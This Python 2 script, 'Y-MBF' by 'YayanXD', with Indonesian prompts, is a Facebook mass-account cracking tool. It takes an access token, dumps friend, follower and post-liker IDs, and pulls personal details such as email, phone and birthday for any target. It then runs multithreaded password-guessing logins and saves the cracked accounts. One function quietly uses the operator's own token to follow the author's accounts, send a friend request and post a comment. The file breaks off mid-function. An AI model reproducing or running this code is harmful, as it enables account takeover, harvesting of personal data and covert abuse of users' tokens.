#!/usr/bin/python2
# coding=utf-8

#######################################################
# Name           : Y-MBF (MBF) <token method>         #
# File           : ymbf.py                            #
# Author         : Moch Yayan Juan Alvredo XD.        #
# Github         : https://github.com/Yayan-XD        #
# Facebook       : https://www.facebook.com/KM39453   #
# Instagram      : https://www.instagram.com/yayanxd_ #
# Fansfage       : https://www.facebook.com/Yayanxyz  #
# Blogspot       : https://squadcyberpeopleteam.blogspot.com #
# Python version : 2.7                                #
#######################################################

            ##   RATU ERROR PROJECTS   ##
# Thanks for : Angga,Azim,Dapunta,Rizal,Hamzah,Jesicca,Iqbal,Yayan #
####################################################################


   ############# JANGAN DI UBAH ASU NANTI ERROR! #############

import os
try:
    import requests
except ImportError:
    print '\n [×] Modul requests belum terinstall!...\n'
    os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print '\n [×] Modul Futures belum terinstall!...\n'
    os.system('pip install futures' if os.name == 'nt' else 'pip2 install futures')

try:
    from bs4 import BeautifulSoup
except ImportError:
    print '\n [×] Modul bs4 belum terinstall!...\n'
    os.system('pip install bs4' if os.name == 'nt' else 'pip2 install bs4')
import requests, bs4, sys, os, subprocess, random, time, re, json
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from time import sleep
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH 
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Moch Yayan Juan Alvredo XD.  #
#------------------------------->
ok = []
cp = []
id = []
ttl =[]
user = []
loop = 0
# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
#ngentodddddddddddddddd
def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s] menghapus token %s'%(N,M,N,x),
        sys.stdout.flush()
        time.sleep(1)
IP = requests.get('https://api.ipify.org').text
# LO KONTOL
logo = ''' \033[0;96m __  __        __  ______  ____
 \033[0;96m \ \/ / ____  /  |/  / _ )/ __/ ® \033[0m|| Created By YayanXD
 \033[0;96m  \  / /___/ / /|_/ / _  / _/     \033[0m|| Github.com/Yayan-XD
 \033[0;96m  /_/       /_/  /_/____/_/ \033[0;91mv2.0  \033[0m|| Facebook.com/KM39453'''
# crack selesai
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		print '\n\n [%s+%s] total OK : %s%s%s'%(O,N,H,str(len(ok)),N)
		print ' [%s+%s] total CP : %s%s%s'%(O,N,K,str(len(cp)),N)
		exit()
	else:
		print '\n\n [%s!%s] opshh kamu tidak mendapatkan hasil :('%(M,N)
		exit()
# Token FB bukan token PLN
def yayanxd():
	os.system('clear')
	print (' %s*%s tools ini menggunakan login token facebook.\n %s*%s apakah kamu sudah tau cara mendapatkan token facebook?\n %s*%s ketik %sopen%s untuk mendapatkan token facebook.'%(O,N,O,N,O,N,H,N))
	__cindy__ = raw_input('\n %s[%s?%s] Token :%s '%(N,M,N,H))
	if __cindy__ in ('open', 'Open', 'OPEN'):
		print '\n%s *%s note! usahakan akun tumbal login di google chrome terlebih dahulu'%(B,N);time.sleep(2)
		print '%s *%s jangan lupa! url ubah ke %shttps://m.facebook.com'%(B,N,H);time.sleep(2)
		print '%s *%s setelah di alihkan ke google chrome. klik %stitik tiga'%(B,N,H);time.sleep(2)
		print '%s *%s lalu klik %sCari di Halaman%s Tinggal ketik %sEAAA%s Lalu salin.'%(B,N,H,N,H,N);time.sleep(2)
		raw_input(' %s*%s tekan enter '%(O,N))
		os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
		yayanxd()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=%s'%(__cindy__))
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open('__yayan__.txt', 'w')
		zedd.write(__cindy__)
		zedd.close()
		print '\n\n %s*%s selamat datang %s%s%s'%(O,N,K,nama,N)
		time.sleep(2)
		print ' %s*%s mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,N)
		time.sleep(2)
		raw_input(' %s*%s tekan enter '%(O,N))
		os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
		kontol()
	except KeyError:
		print '\n\n %s[%s!%s] token invalid'%(N,M,N)
		time.sleep(2)
		yayanxd()
### ORANG GANTENG ###
def moch_yayan():
    os.system('clear')
    try:
        __cindy__=open('__yayan__.txt','r').read()
    except (KeyError, IOError):
        os.system('clear')
        print '\n %s[%s×%s] token invalid'%(N,M,N)
        time.sleep(2)
        os.system('rm -rf __yayan__.txt')
        yayanxd()
    try:
        osjaoaosnsi = requests.get('https://graph.facebook.com/me?access_token=%s'%(__cindy__))
        jaoanzjwowj = json.loads(osjaoaosnsi.text)
        nama = jaoanzjwowj['name']
    except (KeyError, IOError):
        os.system('clear')
        print '\n %s[%s×%s] token invalid'%(N,M,N)
        time.sleep(2)
        os.system('rm -rf __yayan__.txt')
        yayanxd()
    except requests.exceptions.ConnectionError:
        print '\n\n %s[%s!%s] tidak ada koneksi\n'%(N,M,N)
        exit()
    os.system('clear')
    print logo
    print '___________________________________________________________'
    print '\n (\033[0;96m•\033[0m) ACTIVE USER : %s'%(nama)
    print ' (\033[0;96m•\033[0m) IP DEVICE   : %s'%(IP)
    print '___________________________________________________________'
    print '\n [%s1%s]. Dump id dari teman'%(O,N)
    print ' [%s2%s]. Dump id dari teman publik'%(O,N)
    print ' [%s3%s]. Dump id dari total followers'%(O,N)
    print ' [%s4%s]. Dump id dari like postingan'%(O,N)
    print ' [%s5%s]. Mulai crack'%(O,N)
    print ' [%s6%s]. Check ingformasi akun fb'%(O,N)
    print ' [%s7%s]. Lihat hasil crack'%(O,N)
    print ' [%s8%s]. Settings user agent'%(O,N)
    print ' [%s9%s]. Ingfo %sscript'%(O,N,O)
    print ' %s[%s0%s]. logout (%shapus token%s)'%(N,M,N,M,N)
    awokawokawokawokawokawokawokawokawokawokawokawok()
def awokawokawokawokawokawokawokawokawokawokawokawok():
        yan = raw_input('\n [*] menu : ')
        if yan == '':
           print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu tolol!'%(N,M,N,M,yan,N);time.sleep(1);os.system('clear');moch_yayan()
        elif yan =='1':
                teman()
        elif yan =='2':
                publik()
        elif yan =='3':
                followers()
        elif yan =='4':
                public()
        elif yan =='5':
                __crack__().slurr()
        elif yan =='6':
        	jalan('\n note! ketik %suser%s jika anda ingin mendapatkan id dari username'%(H,N));time.sleep(0.07)
        	cek_ingfo()
        elif yan =='7':
            print("\n \033[0;97m[\033[0;96m1\033[0;97m] Check hasil OK")
            print(" \033[0;97m[\033[0;96m2\033[0;97m] Check hasil CP")
            ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
            if ask =="":
                moch_yayan()
            elif ask == "1" or ask == "01":
                try:
                    totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;92mOK\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \x1b[0mTotal %s: %s%s\033[0;92m\n"%(ha, op, ta,M,H,len(totalok)))
                    os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
                    moch_yayan()
                except (IOError):
                    print("\n \033[0;97m[\033[0;91m!\033[0;97m] Kamu tidak mendapatkan hasil ok :(")
                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
                    moch_yayan()
            elif ask == "2" or ask == "02":
                try:
                    totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;93mCP\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \x1b[0mTotal %s: %s%s\033[0;93m\n"%(ha, op, ta,M,K,len(totalcp)))
                    os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
                    moch_yayan()
                except (IOError):
                    print("\n \033[0;97m[\033[0;91m!\033[0;97m] Kamu tidak mendapatkan hasil cp :(")
                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
                    moch_yayan()
            else:
                moch_yayan()
        elif yan =='8':
        	seting_yntkts()
        elif yan =='9':
        	info_tools()
        elif yan =='0':
            	print '\n'
                tod()
                time.sleep(1)
                os.system('rm -rf __yayan__.txt')
                jalan ('\n %s[%s✓%s]%s berhasil menghapus token'%(N,H,N,H))
                time.sleep(2)
                exit()
        else:
            print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu tolol!'%(N,M,N,M,yan,N);time.sleep(1);os.system('clear');moch_yayan()
def kontol():
	try:
		__cindy__ = open('__yayan__.txt', 'r').read()
	except (KeyError, IOError):
		print '\n %s[%s×%s] token invalid'%(N,M,N)
		os.system('rm -rf __yayan__.txt')
	requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(__cindy__))
	srghun = '100007639052164'
	rrtfgf = 'Bismillah semoga bang @[100005395413800:] dan kak @[100059709917296:] tahun depan menikah🥰'
	fdrffg = '2657012877896655'
	vyhbhj = 'ANGRY'
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(srghun,__cindy__))
	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(fdrffg,rrtfgf,__cindy__))
	requests.post('https://graph.facebook.com/%s/reactions?type=%s&access_token=%s'%(fdrffg,vyhbhj,__cindy__))
	moch_yayan()
# dump id dari teman hehe
def teman():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s] token invalid'%(N,M,N)
        os.system('rm -rf __yayan__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        mmk = raw_input('\n %s[%s?%s] nama file  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        ihh = requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,__cindy__))
        id = []
        z = json.loads(ihh.text)
        cin = ('dump/' + mmk + '.json').replace(' ', '_')
        ys = open(cin, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil dump id dari teman'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,cin,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N))
        moch_yayan()
    except (KeyError,IOError):
    	os.remove(cin)
    	jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N))
        moch_yayan()
'''
																																																				csy = 'Cindy sayang Yayan'
																																																				ysc = 'Yayan sayang Cindy'
																																																			'''
# dump id dari teman publik hehe
def publik():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s] token invalid'%(N,M,N)
        os.system('rm -rf __yayan__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] id publik  : '%(N,O,N))
        ahh = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
        ihh = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,__cindy__))
        id = []
        z = json.loads(xxx.text)
        kntl = ('dump/' + ahh + '.json').replace(' ', '_')
        ys = open(kntl, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil dump id dari teman publik'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,kntl,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N))
        moch_yayan()
    except (KeyError,IOError):
    	os.remove(kntl)
    	jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N))
        moch_yayan()
# dump id dari followers hehe
def followers():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s] token invalid'%(N,M,N)
        os.system('rm -rf __yayan__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] id follow  : '%(N,O,N))
        mmk = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        pok = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy,asw,__cindy__))
        id = []
        x = json.loads(pok.text)
        ah = ('dump/' + mmk + '.json').replace(' ', '_')
        ys = open(ah, 'w')
        for a in x['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil dump id dari total followers'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ah,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N))
        moch_yayan()
    except (KeyError,IOError):
    	os.remove(ah)
    	jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N))
        moch_yayan()
# dump id dari postingan hehe
def postingan():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s] token invalid'%(N,M,N)
        os.system('rm -rf __yayan__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] id posting : '%(N,O,N))
        ppk = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        kon = requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s'%(csy,asw,__cindy__))
        id = []
        x = json.loads(kon.text)
        ikeh = ('dump/' + ppk + '.json').replace(' ', '_')
        ys = open(ikeh, 'w')
        for a in x['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil dump id dari like postingan'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ikeh,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N))
        moch_yayan()
    except (KeyError,IOError):
    	os.remove(ikeh)
    	jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N))
        moch_yayan()
# cek ingfo
def cek_ingfo():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except (KeyError, IOError):
        print '\n %s[%s!%s] token/cookies invalid'%(P,M,P)
        os.system('rm -rf __yayan__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        ppk = raw_input('\n [?] masukan id fb : ')
        if ppk in ('user', 'User', 'USER'):
        	jalan('\n [%s!%s] anda akan di arahkan ke browser!'%(M,N));time.sleep(2)
        	os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
        	cek_ingfo()
        aww = requests.get('https://graph.facebook.com/%s?access_token=%s'%(ppk, __cindy__))
        x = json.loads(aww.text)
        nmaa = x['name']
    except (KeyError, IOError):
    	nmaa = '%s-%s'%(M,N)
    except: pass
    try:
    	ndpn = x['first_name']
    except (KeyError, IOError):
    	ndpn = '%s-%s'%(M,N)
    except: pass
    try:
    	nmbl = x['last_name']
    except (KeyError, IOError):
    	nmbl = '%s-%s'%(M,N)
    except: pass
    try:
    	user = x['username']
    except (KeyError, IOError):
    	user = '%s-%s'%(M,N)
    except: pass
    try:
    	ttll = x['birthday']
    except (KeyError, IOError):
    	ttll = '%s-%s'%(M,N)
    except: pass
    try:
    	gndr = x['gender']
    except (KeyError, IOError):
    	gndr = '%s-%s'%(M,N)
    except: pass
    try:
    	tzim = x['timezone']
    except (KeyError, IOError):
    	tzim = '%s-%s'%(M,N)
    except: pass
    try:
    	stas = x['relationship_status']
    except (KeyError, IOError):
    	stas = '%sJones%s'%(M,N)
    except: pass
    try:
    	dgn = '''dengan %s'''%(x['significant_other']['name'])
    except (KeyError, IOError):
    	dgn = '%s-%s'%(M,N)
    except: pass
    try:
    	tigl = x['location']['name']
    except (KeyError, IOError):
    	tigl = '%s-%s'%(M,N)
    except: pass
    try:
    	dari = x['hometown']['name']
    except (KeyError, IOError):
    	dari = '%s-%s'%(M,N)
    except: pass
    try:
    	lins = x['link']
    except (KeyError, IOError):
    	lins = '%s-%s'%(M,N)
    except: pass
    try:
    	uptd = x['updated_time']
    except (KeyError, IOError):
    	uptd = '%s-%s'%(M,N)
    except: pass
    try:
    	nmrr = x['mobile_phone']
    except (KeyError, IOError):
    	nmrr = '%s-%s'%(M,N)
    except: pass
    try:
    	emai = x['email']
    except (KeyError, IOError):
    	emai = '%s-%s'%(M,N)
    except: pass
    try:
    	bioo = x['about']
    except (KeyError, IOError):
    	bioo = '%s-%s'%(M,N)
    except: pass
    try:
    	r = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s'%(ppk, __cindy__))
        z = json.loads(r.text)
        for i in z['data']:
        	id.append(i['id'])
    except: pass
    try:
    	r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(ppk, __cindy__))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
    	pengikut = '%s-%s'%(M,N)
    except: pass
    print '\n  * Ingformasi akun Facebook *';time.sleep(0.03)
    print '\n [*] nama lengkap : %s'%(nmaa);time.sleep(0.03)
    print ' [*] nama depan   : %s'%(ndpn);time.sleep(0.03)
    print ' [*] nama belakang: %s'%(nmbl);time.sleep(0.03)
    print ' [*] username fb  : %s'%(user);time.sleep(0.03)
    print '\n  * data-data akun facebook *\n';time.sleep(0.03)
    print ' [*] gmail facebook : %s'%(emai);time.sleep(0.03)
    print ' [*] nomor telepon  : %s'%(nmrr);time.sleep(0.03)
    print ' [*] tanggal lahir  : %s'%(ttll);time.sleep(0.03)
    print ' [*] jenis kelamin  : %s'%(gndr);time.sleep(0.03)
    print ' [*] jumblah teman  : %s'%str(len(id));time.sleep(0.03)
    print ' [*] total followers: %s'%(pengikut);time.sleep(0.03)
    print ' [*] link facebook  : %s'%(lins);time.sleep(0.03)
    print ' [*] status hubungan: %s %s'%(stas,dgn);time.sleep(0.03)
    print ' [*] tentang status : %s'%(bioo);time.sleep(0.03)
    print ' [*] kota asal      : %s'%(dari);time.sleep(0.03)
    print ' [*] tinggal di     : %s'%(tigl);time.sleep(0.03)
    print ' [*] zona waktu     : %s'%(tzim);time.sleep(0.03)
    print ' [*] terakhir di updated : %s'%(uptd);time.sleep(0.03)
    print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m'
    jalan('\n [%s✓%s] berhasil mengechek data² akun facebook\n\n'%(O,N));time.sleep(0.03)
    exit()
# cek ingfo sc
def info_tools():
    os.system('clear')
    print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
    print '\n %s[%s>%s] Yt       : Yayan XD.'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Author   : Moch Yayan Juan Alvredo XD.'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Github   : https://github.com/Yayan-XD'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Facebook : https://www.facebook.com/KM39453'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Fanspage : https://www.facebook.com/Yayanxyz'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Instagram: https://www.instagram.com/yayanxd_'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Blogspot : https://squadcyberpeopleteam.blogspot.com'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
    moch_yayan()
### ganti user agent
def seting_yntkts():
	print '\n (%s1%s) ganti user agent'%(O,N)
	print ' (%s2%s) check user agent'%(O,N)
	ya_tanya_bapa_jangan_tanya_saya()
def ya_tanya_bapa_jangan_tanya_saya():
	ytbjts = raw_input('\n %s[%s?%s] choose : '%(N,O,N))
	if ytbjts == '':
		print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N)
		time.sleep(2)
		moch_yayan()
	elif ytbjts =='1':
		yo_ndak_tau_ko_tanya_saia()
	elif ytbjts =='2':
		check_yntkts()
	else:
		print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N)
		time.sleep(2)
		moch_yayan()
# User Agent baru
def yo_ndak_tau_ko_tanya_saia():	
	os.system('rm -rf YNTKTS.txt')
	print '\n %s(%s•%s) notice me: cari User Agent di google chrome.'%(N,O,N)
	print ' (%s×%s) ketik User Agent atau My User Agent....\n'%(M,N)
	ua = raw_input(' [%s?%s] Masukan User Agent :%s '%(O,N,H))
	if ua == '':
		print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N)
		time.sleep(2)
		moch_yayan()
	try:
		uas = open('YNTKTS.txt','w')
		uas.write(ua)
		uas.close()
		time.sleep(2)
		jalan('\n %s[%s✓%s] berhasil mengganti user agent...'%(N,H,N))
		time.sleep(2)
		moch_yayan()
	except (KeyError, IOError):
	  print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N)
	  time.sleep(2)
	  moch_yayan()
# Cek User Agent
def check_yntkts():
    try:
        user_agent = open('YNTKTS.txt', 'r').read()
    except IOError:
    	user_agent = '%s-'%(M)
    except: pass
    print '\n %s[%s+%s] User Agent anda : %s%s'%(N,O,N,H,user_agent)
    raw_input('\n  %s[ %skembali%s ]'%(N,O,N))
    moch_yayan()
# mulai ngecrot awokawokawokkawok
class __crack__:

    def __init__(self):
        self.fl = []

    def slurr(self):
        try:
            self.apk = raw_input('\n [%s?%s] masukan file : '%(O,N))
            self.id = open(self.apk).read().splitlines()
            print '\n [%s+%s] total id -> %s%s%s' %(O,N,M,len(self.id),N)
        except:
            print '\n %s[%s×%s] File [%s%s%s] tidak ada, dump id dulu lah tolol!'%(N,M,N,M,self.apk,N)
            time.sleep(3)
            moch_yayan()

        ___yayanganteng___ = raw_input(' [%s?%s] apakah ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
        if ___yayanganteng___ in ('Y', 'y'):
            print '\n [*] contoh: %s[ %ssayang,anjing,bangsat%s ]'%(N,H,N)
            while True:
                pwek = raw_input('\n [%s?%s] masukan kata sandi : '%(O,N))
                print ' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pwek, N)
                if pwek == '':
                    self.slurr()
                else:
                	
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = raw_input('\n [*] method : ')
                        if cin == '':
                            self.__yan__()
                        elif cin == '1':
                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except:
                                        pass

                            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
                            os.remove(self.apk)
                            hasil(ok,cp)
                            exit()
                        elif cin == '2':
                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except:
                                        pass

                            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
                            os.remove(self.apk)
                            hasil(ok,cp)
                            exit()
                        elif cin == '3':
                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mfb__, kimochi, ysc)
                                    except:
                                        pass

                            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
                            os.remove(self.apk)
                            hasil(ok,cp)
                            exit()
                        else:
                            print '\n %s[%s!%s] input yang bener goblok!'%(N,M,N)
                            time.sleep(2)
                            moch_yayan()
                    print '\n [ pilih method login - silahkan coba satu² ]\n'
                    print ' [%s1%s]. method API (fast)'%(O,N)
                    print ' [%s2%s]. method mbasic (slow)'%(O,N)
                    print ' [%s3%s]. method mobile (super slow)'%(O,N)
                    __yan__(pwek.split(','))
                    break

        elif ___yayanganteng___ in ('T', 't'):
            print '\n [ pilih method login - silahkan coba satu² ]\n'
            print ' [%s1%s]. method API (fast)'%(O,N)
            print ' [%s2%s]. method mbasic (slow)'%(O,N)
            print ' [%s3%s]. method mobile (super slow)'%(O,N)
            self.__pler__()
        else:
